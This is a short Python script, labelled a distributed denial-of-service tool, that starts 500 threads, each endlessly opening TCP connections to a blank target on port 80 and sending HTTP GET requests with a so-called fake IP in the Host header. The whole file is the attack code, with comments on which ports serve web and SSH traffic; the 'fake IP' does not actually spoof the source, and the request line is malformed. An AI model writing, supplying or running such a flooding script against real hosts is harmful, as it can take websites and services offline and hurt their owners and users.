# distributed denial of service

import threading
import socket

# multi threading not really available in python

target = '' # ip address or domain name
# default gateway is router
# port 22 is ssh (cli service)
# port 80 is http (web service)
# port 443 is https (web service)
port = 80
fake_ip = ''

already_connected = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(('GET /' + target + 'HTTP/1.1\r\n').encode('ascii'), (target, port))
        s.sendto(('Host: ' + fake_ip + '\r\n\r\n').encode('ascii'), (target, port))
        s.close()

        global already_connected
        already_connected += 1
        if already_connected % 500 == 0:
            print(already_connected)

# running in multiple threads
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()